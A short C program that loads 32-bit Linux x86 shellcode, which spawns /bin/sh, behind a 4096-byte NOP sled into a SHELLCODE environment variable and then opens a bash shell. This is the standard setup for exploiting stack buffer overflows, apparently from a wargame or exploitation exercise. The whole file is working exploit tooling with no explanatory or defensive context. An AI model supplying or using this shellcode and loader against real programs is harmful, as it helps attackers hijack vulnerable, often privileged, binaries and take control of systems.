#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define NOP 0x90

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

int main(void) {
  char shell[4096];
  puts("Shellcode loaded into environment.\n");
  memset(shell, NOP, 4096);
  memcpy(&shell[4096 - strlen(shellcode)], shellcode, strlen(shellcode));
  setenv("SHELLCODE", shell, 1);
  putenv(shell);
  system("bash");

  return 0;
}